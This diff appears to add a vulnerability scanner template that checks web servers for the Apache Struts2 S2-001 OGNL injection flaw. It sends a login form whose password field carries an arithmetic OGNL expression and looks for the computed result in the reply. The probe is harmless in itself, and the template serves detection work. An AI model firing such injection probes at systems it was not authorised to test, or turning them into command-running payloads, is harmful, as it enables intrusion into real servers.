@@ -1,0 +1,32 @@
+id: local-struts2-s2-001-math
+
+info:
+  name: Struts2 S2-001 OGNL Injection via Form Validation (CVE-2007-4556)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-001 OGNL injection via form field re-population on validation failure.
+    Safe math probe: %{233*233} evaluates to 54289 in input value attribute.
+  reference:
+    - https://struts.apache.org/docs/s2-001.html
+  tags: safe-poc,struts2,s2-001,cve,cve2007,ognl,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login.action"
+      - "{{BaseURL}}/index.action"
+      - "{{BaseURL}}/user/login.action"
+    body: "username=admin&password=%25%7B233*233%7D"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 200
